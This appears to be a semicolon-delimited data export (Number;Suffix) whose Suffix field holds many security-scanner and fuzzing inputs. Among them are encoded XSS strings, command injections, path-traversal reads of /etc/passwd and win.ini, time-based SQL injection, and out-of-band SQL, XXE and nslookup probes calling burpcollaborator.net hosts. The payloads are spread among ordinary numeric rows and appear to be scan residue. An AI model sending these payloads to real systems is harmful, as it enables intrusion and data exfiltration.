Number;Suffix;
2;NULL;
938;%60ls%20-al%20%2f%60;
0;;
247;NULL;
938;%3ca%20href%3d%22%5cxE1%5cx9A%5cx80javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
4;NULL;
68;NULL;
23;;
71;NULL;
42;;
13;B;
5;NULL;
75;;
7;A;
1;NULL;
19;NULL;
100;;
25;NULL;
8;;
9;;
938;;
96;;
938;;
938;;
938;;
1;;
4;NULL;
938;;
24;NULL;
938;;
39;NULL;
938;;
75;;
10;;
938;;
83;NULL;
212;NULL;
938;%7b%221%22%3a0%7d;
68;NULL;
938;;
9;NULL;
938;;
71;NULL;
5;NULL;
938;;
39;NULL;
938;;
75;;
1;NULL;
111;;
26;A;
938;#%20and%20U%2b007F%20(DEL);
75;;
938;❤️%20💔%20💌%20💕%20💞%20💓%20💗%20💖%20💘%20💝%20💟%20💜%20💛%20💚%20💙;
938;;
2;NULL;
8;NULL;
938;%3cfoo%20val%3d“bar”%20%2f%3e;
938;%3cfoo%20val%3d%60bar'%20%2f%3e;
3;NULL;
12;3;
8;NULL;
2;NULL;
45;NULL;
14;;
1;NULL;
24;NULL;
1;NULL;
75;\windows\win.ini;
68;;
7;A;
13;NULL;
115;;
938;🇺🇸🇷🇺🇸%20🇦🇫🇦🇲🇸;
13;NULL;
938;NIL;
938;;
17;NULL;
22;a;
3;NULL;
7;A;
7;;
1;;
938;%3ca%20href%3d%22%5cx17javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
150;;
25;NULL;
7;;
71;NULL;
71;NULL;
20;NULL;
4;NULL;
3;T;
75;;
12;;
24;NULL;
122;;
8;NULL;
12;;
938;;
83;NULL;
25;NULL;
26;-13;
938;%3cSCRIPT%20SRC%3d%2f%2fha%2eckers%2eorg%2f%2ej%3e;
938;;
75;";declare @q varchar(99);set @q='\\fo7pyb2d641bs0xnnq6yz0ef76d01rpif67tzho.burpcollab'+'orator.net\enf'; exec master.dbo.xp_dirtree @q;-- ";
11;;
938;;
501;NULL;
150;NULL;
20;NULL;
88;C;
8;NULL;
26;A;
2;NULL;
938;;
75 and 6301=6306-- ;;
39;;
34;a;
17;NULL;
938;;
80;NULL;
80;NULL;
938;0%2e0%2f0;
17;NULL;
938;%3ca%20href%3d%22%5cxE1%5cxA0%5cx8Ejavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
75;NULL;
1;NULL;
24;NULL;
4;;
24;NULL;
938;;
34;a;
17;NULL;
4;NULL;
247;NULL;
75;;
938;;
938;#%20%20%20%20%20%20XXE%20Injection%20(XML);
938;😍;
9;NULL;
938;;
22;NULL;
14;;
938;;
3;NULL;
938;;
24;NULL;
938;;
8;NULL;
938;;
415;;
75;;
6;;
26;A;
6;;
1HNeOiZeFu7gP1lxi5tdAwGcB9i2xR+Q2jpmbuwTqzU=;ypeBEsobvcr6wjGzmiPcTaeG7/gUfE5yuYB3ha/uSLs=;
938;-;
24;;
27;;
938;;
26;A;
18;;
39;NULL;
39;NULL;
26;A;
7;A;
938;;
6;;
2;;
24;NULL;
75;|nslookup -q=cname 5msfw1034uz1qqvdlg4oxqc55wbqzhndb5yxmm.burpcollaborator.net.&;
938;%3ca%20href%3d%22%5cx07javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
938;%22%60'%3e%3cscript%3e%5cxE3%5cx80%5cx80javascript%3aalert(1)%3c%2fscript%3e;
19;NULL;
938;;
25;NULL;
10;;
75;;
71;NULL;
75;;
18;;
3;a;
938;;
-1;;
9;NULL;
2;;
938;%22%60'%3e%3cscript%3e%5cxE2%5cx80%5cx8Ajavascript%3aalert(1)%3c%2fscript%3e;
938;[];
12;NULL;
938;;
4;;
9;NULL;
39;NULL;
71;NULL;
11;;
3;NULL;
68;;
203;;
1;NULL;
14;;
938;;
938;;
39;NULL;
19;NULL;
5;a;
25;NULL;
21;;
212;NULL;
39;NULL;
938;;
75;http://7emho3s5wwr3isnfdiwqps47xy3srjf931qtei.burpcollaborator.net/?null;
1;NULL;
71;NULL;
938;;
75;;
5;NULL;
13;;
1;NULL;
7;A;
23;;
5;;
3;NULL;
75;;
938;;
25;NULL;
1000;;
1;;
938;;
938;%3cimg%20src%3dx%5cx10onerror%3d%22javascript%3aalert(1)%22%3e;
938;;
1000;;
2;NULL;
13;NULL;
938;;
938;;
938;;
938;;
9;;
2;NULL;
938;;
68;;
60;AA;
34;a;
938;;
9;NULL;
34;a;
27;;
15;;
2;B;
7;A;
9;NULL;
18;;
938;[,,,,];
2;NULL;
1;NULL;
3;;
938;%7b%22%5cx00%22%3a%220%22%7d;
938;;
938;;
75;;
938;;
938;;
8;;
4;NULL;
75;;
45;NULL;
75;;
4;A;
1;NULL;
150;NULL;
50;;
938;;
100;;
212;NULL;
GmViWQ7xnRBF0GxAVXQtOCiOnm3NcczeXO6A8dWndOs=;;
938;;
49;;
4;;
10;;
13;NULL;
75' and 1047=1049-- ;;
68;NULL;
68;NULL;
71;NULL;
80;NULL;
50;NULL;
1;NULL;
4;NULL;
938;;
71;NULL;
4;NULL;
938;%3ca%20href%3d%22%5cx13javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
4;NULL;
3;NULL;
1;NULL;
13;;
9;NULL;
938;;
75;../../../../../../../../../../../../../../../../etc/passwd;
19;NULL;
1;NULL;
39;NULL;
938;;
3;NULL;
71;NULL;
75;;
501;;
19;NULL;
938;%@;
3;NULL;
938;;
501;NULL;
80;NULL;
75;;
1;NULL;
3;NULL;
75;NULL;
1;NULL;
4;;
80;;
86;;
20;NULL;
34;a;
938;-0%2e0;
3;NULL;
247;NULL;
938;;
1;NULL;
4;;
938;;
938;;
116;;
68;;
68;NULL;
80;NULL;
71;NULL;
212;NULL;
6;;
75;;
80;NULL;
938;#;
37;;
1;;
9;NULL;
80;NULL;
938;-999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999;
71;NULL;
75;;
23;;
938;%3cimg%5cx13src%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e;
25;NULL;
2;NULL;
938;;
938;;
7;;
127;;
17;NULL;
938;;
26;A;
13;;
24;NULL;
6;;
68;;
9;NULL;
12;NULL;
9;;
83;NULL;
71;NULL;
938;#;Credit%3a%20https%3a%2f%2ftwitter%2ecom%2fjifa%2fstatus%2f625776454479970304
9;NULL;
45;NULL;
34;a;
68;NULL;
938;;
39;NULL;
72;;
24;NULL;
22;A;
49;E;
938;[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null];
1;NULL;
8;NULL;
1;NULL;
1;NULL;
938;;
72;;
1;NULL;
456;;
938;;
1;NULL;
71;NULL;
8;NULL;
1;NULL;
68;NULL;
938;%3cBODY%20onload!#$%%26()%2a~%2b-_%2e,%3a%3b%3f@[%2f%7c%5c]%5e%60%3dalert(%22XSS%22)%3e;
3;NULL;
325;;
26;A;
41;NULL;
1;NULL;
938;;
17;;
26;A;
938;;
938;;
3;NULL;
938;;
34;a;
167;;
26;A;
938;;
938;#NAME?;
8;NULL;
938;;
938;;
938;;
247;NULL;
34;a;
39;NULL;
71;NULL;
22;NULL;
938;%60%22'%3e%3cimg%20src%3dxxx%3ax%20%5cx27onerror%3djavascript%3aalert(1)%3e;
938;;
oxn5w${447*793}f3p13;;
938;#%20Non-whitespace%20C0%20controls%3a%20U%2b0001%20through%20U%2b0008,%20U%2b000E%20through%20U%2b001F,;
68;;
938;%3ca%20href%3d%22%5cx1Ajavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
11;;
938;𝕋𝕙𝕖%20𝕢𝕦𝕚𝕔𝕜%20𝕓𝕣𝕠𝕨𝕟%20𝕗𝕠𝕩%20𝕛𝕦𝕞𝕡𝕤%20𝕠𝕧𝕖𝕣%20𝕥𝕙𝕖%20𝕝𝕒𝕫𝕪%20𝕕𝕠𝕘;
938;;
25;NULL;
2;NULL;
75;;
71;NULL;
22;NULL;
938;test⁠test‫;
25;NULL;
20;NULL;
11;;
25;;
80;NULL;
20;NULL;
68;NULL;
938;#%20contexts%2e%20%20Divided%20into%20three%20groups%20based%20on%20(US-layout)%20keyboard%20position%2e;
243;2;
39;NULL;
83;NULL;
938;%7b%22%5cx00%22%3a[]%7d;
938;%22%60'%3e%3cscript%3e%5cxE1%5cxA0%5cx8Ejavascript%3aalert(1)%3c%2fscript%3e;
71;NULL;
1;NULL;
24;NULL;
68;NULL;
8;NULL;
9;NULL;
2;;
938;;
2;;
1;NULL;
14;;
34;a;
75;;
938;;
8;NULL;
17;NULL;
938;;
3;NULL;
938;;
3;NULL;
1;NULL;
150;NULL;
3;NULL;
4;;
75;..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\winnt\win.ini;
26;A;
2;;
75)waitfor delay'0:0:20'--;;
938;;
938;;
24;NULL;
938;;
5;a;
3;NULL;
71;NULL;
938;;
14;;
75;;
938;;
25;;
75;;
8;NULL;
45;NULL;
1;NULL;
42;;
39;NULL;
71;NULL;
7;A;
9;NULL;
75;;
75;;
4;NULL;
938;;
3;NULL;
24;NULL;
1;;
26;A;
938;;
938;;
22;NULL;
4;NULL;
30;;
75;;
75;' waitfor delay'0:0:20'--;
39;NULL;
75;;
83;;
68;NULL;
68;NULL;
938;ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя;
19;;
938;;
10;;
8;NULL;
3;NULL;
4;;
22;NULL;
938;;
6;;
21;;
19;2;
11;;
938;;
20;;
75;;
24;NULL;
938;#%20Often%20forbidden%20to%20appear%20in%20various%20text-based%20file%20formats%20(e%2eg%2e%20XML),;
10;A;
22;B;
1;NULL;
938;;
938;;
501;;
24;NULL;
67;;
938;;
938;;
938;Dr%2e%20Herman%20I%2e%20Libshitz;
22;;
938;;
17;;
938;;
938;;
938;;
7;A;
938;;
26;;
15;;
1;NULL;
75;;
39;NULL;
8;NULL;
80;NULL;
39;;
25;NULL;
501;NULL;
9;;
9;NULL;
79;;
24;NULL;
75;;
938;%3cIMG%20SRC%3d%22jav%26#x0A%3bascript%3aalert('XSS')%3b%22%3e;
2;NULL;
19;NULL;
938;;
75;;
75;;
9;NULL;
3;NULL;
85;;
1;B;
20;;
75;86924001' or '4969'='4972;
938;hasOwnProperty;
75;;
20;NULL;
-1,00E+02;;
80;NULL;
68;NULL;
2;NULL;
75;;
22;NULL;
3;NULL;
150;;
30;;
938;;
24;NULL;
83;NULL;
247;NULL;
19;NULL;
247;NULL;
19;NULL;
247;NULL;
19;NULL;
24;NULL;
9;NULL;
938;;
1;NULL;
7;;
14;;
12;NULL;
26;A;
938;;
8;;
938;;
938;;
4;NULL;
938;;
45;NULL;
4;NULL;
2;NULL;
1;NULL;
22;NULL;
39;NULL;
20;NULL;
24;NULL;
1;NULL;
22;a;
22;NULL;
39;NULL;
19;;
4;;
19;NULL;
35;;
2;A;
938;;
24;NULL;
938;%22%60'%3e%3cscript%3e%5cxE2%5cx80%5cx84javascript%3aalert(1)%3c%2fscript%3e;
938;;
938;;
75;;
247;NULL;
eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'));;
938;;
1;;
83;NULL;
39;NULL;
39;NULL;
938;・(￣∀￣)・%3a%2a%3a;
7;A;
75;;
938;;
3;;
17;NULL;
83;NULL;
7;A;
13;NULL;
8;NULL;
256;NULL;
80;;
938;;
938;;
938;;
75;;
12;;
938;;
75;...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\windows\win.ini;
75;;
2;NULL;
2;NULL;
23;;
938;;
60;NULL;
9;NULL;
938;;
25;NULL;
80;NULL;
71;NULL;
938;;
938;;
50;;
75;' and 9844=9844-- ;
83;NULL;
17;NULL;
75;;
2;NULL;
11;;
96;;
938;;
80;;
31;;
11;;
12;;
938;;
938;;
9;;
938;;
8;;
5;;
1;NULL;
71;NULL;
75;;
4;;
243;2;
24;NULL;
23;;
938;;
19;NULL;
71;NULL;
938;;
47;;
3;NULL;
501;NULL;
16;;
7;;
3;NULL;
1;;
51;;
50;NULL;
8;;
71;NULL;
938;;
938;;
55;;
8;NULL;
3;NULL;
11;;
3;NULL;
49;;
71;NULL;
75;"'||(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % xhsdm SYSTEM ""http://7kshu3y52wx3ostfji2qvsa73y9sxjln9fw7kw.burpcollab'||'orator.net/"">%xhsdm;]>'),'/l') from dual)||'";
75;;
938;%3cscript%5cx0Atype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e;
22;NULL;
6;;
24;NULL;
182;;
3;;
6;;
17;NULL;
200;;
1;A;
19;NULL;
938;;
99;;
938;;
938;The%20quick%20brown%20fox%2e%2e%2e%20[Beeeep];
24;NULL;
247;NULL;
5;NULL;
2;;
2;NULL;
938;;
938;;
23;;
938;;
25;;
71;NULL;
501;NULL;
938;;
12;NULL;
9;NULL;
938;;
150;NULL;
15;NULL;
68;NULL;
22;NULL;
938;;
8;NULL;
938;;
938;;
32;;
3;NULL;
17;NULL;
938;%22new%20Date(1335205592410)%22;
1;NULL;
13;A;
938;;
938;;
111;;
10;;
938;;
301;;
1;NULL;
17;NULL;
938;;
26;A;
2;NULL;
75;;
1;NULL;
938;;
938;;
938;;
71;NULL;
22;a;
75;;
22;A;
938;;
938;;
938;;
68;NULL;
24;NULL;
26;A;
938;;
75;;
75;;
15;A;
1;NULL;
8;NULL;
71;NULL;
4;NULL;
938;;%20             ​    　
938;;
4;NULL;
45;D;
938;;
39;NULL;
75;;
938;;
938;;
1;NULL;
938;;
75;{${sleep(20)}};
1;;
938;;
54;;
26;A;
938;;
938;#NAME?;
24;NULL;
938;𝕿𝖍𝖊%20𝖖𝖚𝖎𝖈𝖐%20𝖇𝖗𝖔𝖜𝖓%20𝖋𝖔𝖝%20𝖏𝖚𝖒𝖕𝖘%20𝖔𝖛𝖊𝖗%20𝖙𝖍𝖊%20𝖑𝖆𝖟𝖞%20𝖉𝖔𝖌;
938;;
938;;
15;NULL;
4;NULL;
2;NULL;
938;;
29;;
938;;
938;;
938;;
34;a;
83;NULL;
24;NULL;
75;8zt69gsf9eÁbm8jaapa4b;
25;NULL;
938;%7b%22__kind%22%3a%22null%22,%22A%22%3a%22B%22%7d;
34;a;
17;NULL;
80;NULL;
26;A;
71;NULL;
19;;
938;%3cimg%20%5cx47src%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e;
39;NULL;
938;;
938;%x('ls%20-al%20%2f');
938;;
938;%22%60'%3e%3cscript%3e%5cxE2%5cx80%5cx83javascript%3aalert(1)%3c%2fscript%3e;
75;tw6al8d1kl\\l8nbeb54i3;
16;;
158;ZW;
1;;
90;;
938;;
8;;
71;NULL;
938;;
11;;
68;NULL;
75;;
938;;
3;NULL;
12;;
8;NULL;
1;NULL;
14;;
13;;
80;;
938;;
17;NULL;
26;A;
1;NULL;
938;;
71;NULL;
12;NULL;
7;;
938;;
39;NULL;
116;;
938;;
11;;
3;NULL;
12;NULL;
938;;
13;;
938;;
938;ثم%20نفس%20سقطت%20وبالتحديد،,%20جزيرتي%20باستخدام%20أن%20دنو%2e%20إذ%20هنا؟%20الستار%20وتنصيب%20كان%2e%20أهّل%20ايطاليا،%20بريطانيا-فرنسا%20قد%20أخذ%2e%20سليمان،%20إتفاقية%20بين%20ما,%20يذكر%20الحدود%20أي%20بعد,%20معاملة%20بولندا،%20الإطلاق%20عل%20إيو%2e;
938;;
1;NULL;
938;;
75;;
1;NULL;
5;;
2;NULL;
2;;
11;;
3;;
938;;
20;NULL;
938;;
7;A;
26;A;
68;NULL;
7;;
22;a;
45;NULL;
3;NULL;
75;;
75;;
26;A;
938;;
1;NULL;
251;;
39;NULL;
25;;
71;NULL;
938;;
938;;
10;NULL;
1;NULL;
8;NULL;
4;NULL;
9;NULL;
1;X;
3;NULL;
938;;
9;;
9;NULL;
15;;
39;NULL;
247;NULL;
938;;
26;A;
938;;
923;;
31;;
938;;
xgrei;;
147440;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
9;NULL;
203;;
91;;
1;;
1;NULL;
4;NULL;
1;NULL;
5;NULL;
1;NULL;
19;NULL;
938;#;Strings%20which%20are%20reserved%20characters%20in%20MSDOS%2fWindows
68;NULL;
938;COM1;
68;NULL;
1;;
10;;
75;;
938;%22%60'%3e%3cscript%3e%5cx21javascript%3aalert(1)%3c%2fscript%3e;
69;;
1;NULL;
11;;
938;;
45;NULL;
938;;
938;1000;
34;a;
938;;
24;NULL;
6;;
938;;
25;NULL;
19;NULL;
938;;
3;NULL;
10;;
83;NULL;
34;a;
938;FALSE;
3;NULL;
32;NULL;
5;NULL;
938;%60touch%20%2ftmp%2fblns%2efail%60;
938;;
17;NULL;
4;;
25;NULL;
83;NULL;
34;;
68;NULL;
938;;
938;;
75;;
43;;
80;NULL;
8;NULL;
8;;
8;Skûtmakker;
938;;
75;;
26;A;
75;/././address;
17;NULL;
24;NULL;
938;%3cimg%20src%5cx11%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e;
1;NULL;
3;NULL;
1;NULL;
17;NULL;
938;;
45;NULL;
938;;
12;;
51;NULL;
6;NULL;
75;wchw7<a>dawa5;
20;NULL;
7;;
68;NULL;
1;NULL;
938;;
1;NULL;
938;;
938;;
938;%3cSCRIPT%20SRC%3dhttp%3a%2f%2fha%2eckers%2eorg%2fxss%2ejs%3f%3c%20B%20%3e;
24;NULL;
91;;
5;NULL;
212;NULL;
938;;
8;;
938;;
71;NULL;
938;#%20Unicode%20additional%20control%20characters%3a%20all%20of%20the%20characters%20with;
4;NULL;
3;NULL;
5;;
34;a;
75;;
938;;
20;NULL;
200;NULL;
1;NULL;
938;;
247;NULL;
938;%60%22'%3e%3cimg%20src%3dxxx%3ax%20%5cx00onerror%3djavascript%3aalert(1)%3e;
75;.../address;
75;;
195;;
3;NULL;
12;;
938;;
8;;
938;;
1;NULL;
71;NULL;
51;;
3;NULL;
1;NULL;
938;;
50;;
3;NULL;
938;;
25;NULL;
1;A;
1;NULL;
938;;
75;'|ping -c 21 127.0.0.1 #;
71;NULL;
2;NULL;
75;;
83;;
20;NULL;
155;;
13;NULL;
938;;
5;a;
8;;
31;NULL;
938;;
33;A;
938;;
40;;
39;NULL;
15;;
938;;
938;;
75;;
3;NULL;
75lpsnw34s5w\\ljzcaeg6d4;;
938;;
1;NULL;
42;;
1;NULL;
938;%26lt%3bscript%26gt%3balert(%26#39%3b123%26#39%3b)%3b%26lt%3b%2fscript%26gt%3b;
938;;
938;;
938;;
13;;
KEt+bXiPNj+RD3vrGRBHPiPOnWyHHxzg8x8iqYLUitQ=;;
1;NULL;
8;NULL;
75;;
1;NULL;
39;NULL;
4;;
24;NULL;
14;;
938;;
75;;
18;;
17;NULL;
10;;
938;LPT1;
938;#;Strings%20which%20contain%20text%20that%20should%20be%20rendered%20RTL%20if%20possible%20(e%2eg%2e%20Arabic,%20Hebrew)
4;NULL;
71;NULL;
150;NULL;
3;NULL;
938;;
80;NULL;
938;;
17;NULL;
39;NULL;
938;;
2;;
71;NULL;
75;;
39;NULL;
142;;
75;;
10;;
25;;
9;NULL;
938;;
3;NULL;
75;;
131;;
14;;
14;;
938;;
25;NULL;
938;;
938;8;
239;;
938;;
39;NULL;
31;NULL;
80;NULL;
938;;
938;;
1;NULL;
26;A;
938;;
12;NULL;
938;;
938;;
938;COM3;
10;;
4;NULL;
65;NULL;
938;1%2e0%2f0%2e0;
938;;
39;NULL;
23;;
60;NULL;
37;NULL;
75;;
26;A;
11;;
26;A;
938;%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts;
75;alert(1);
12;NULL;
25;NULL;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
2;NULL;
17;NULL;
938;;
134;;
938;;
938;;
8;;
39;NULL;
22;NULL;
938;;
75;;
83;NULL;
65;NULL;
19;NULL;
227;;
13;NULL;
938;;
68;NULL;
3;NULL;
22;NULL;
124;;
1;NULL;
8;NULL;
938;;
17;NULL;
938;;
25;NULL;
6;NULL;
1;NULL;
75;;
938;;
124;;
1;NULL;
1;NULL;
938;;
3;;
75;;
25;NULL;
938;;
1;;
938;;
938;;
2;NULL;
247;NULL;
39;NULL;
75;;
75;;
75;;
1;NULL;
80;NULL;
24;NULL;
22;a;
938;;
68;NULL;
96;;
11;;
3;NULL;
5;;
1;NULL;
938;#;Innocuous%20strings%20which%20may%20be%20blocked%20by%20profanity%20filters%20(https%3a%2f%2fen%2ewikipedia%2eorg%2fwiki%2fScunthorpe_problem)
68;NULL;
10;;
14;A;
4;;
24;NULL;
115;;
75;;
22;NULL;
68;NULL;
938;;
3;NULL;
3;NULL;
9;NULL;
938;,。・%3a%2a%3a・゜’(%20☻%20ω%20☻%20)。・%3a%2a%3a・゜’;
83;NULL;
938;;
938;;
212;NULL;
938;;
39;NULL;
24;NULL;
7;A;
24;NULL;
1;NULL;
39;NULL;
3;NULL;
5;;
19;NULL;
68;NULL;
938;;
3;A;
1;NULL;
71;NULL;
30;NULL;
938;1,00E+02;
68;NULL;
501;NULL;
938;;
13;NULL;
75;;
938;;
9;;
39;NULL;
"<nlm xmlns=""http://a.b/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://a.b/ http://nkbxujyl2cxjo8tvjy26v8an3e98xzlz9rwik7.burpcollaborator.net/nlm.xsd"">nlm</nlm>";;
15;;
938;;
14;;
938;;
938;;
938;%221%22;
8;;
21;;
938;;
75;;
8;NULL;
21;;
263;;
26;A;
938;eval(%22while(1)%3b%22);
9;NULL;
10;;
39;NULL;
67;;
938;;
50;;
75;NULL;
938;%20onfocus%3dJaVaSCript%3aalert(123)%20autofocus;
69;;
13;;
7;a;
938;;
24;NULL;
938;;
938;;
39;NULL;
938;#;Strings%20which%20contain%20unicode%20subscripts%2fsuperscripts%3b%20can%20cause%20rendering%20issues
10;;
938;;
17;;
938;%3csvg%3e%3cscript%3e123%3c1%3ealert(123)%3c%2fscript%3e;
2;NULL;
6;NULL;
938;;
938;;
71;NULL;
75;;
425;;
938;찦차를%20타고%20온%20펲시맨과%20쑛다리%20똠방각하;
1;;
97;6a;
71;NULL;
938;;
34;a;
938;[%22%3a%5cx00%22,%20%221%22];
66;;
4;NULL;
3;NULL;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
104;;
1;;
17;NULL;
"75%}lytzx'/""<rk5f7";;
51;NULL;
7;;
14;;
10;;
71;NULL;
75;;
26;A;
3;NULL;
938;;
9;NULL;
10;;
1;NULL;
71;NULL;
30;;
938;;
1;NULL;
9;NULL;
80;NULL;
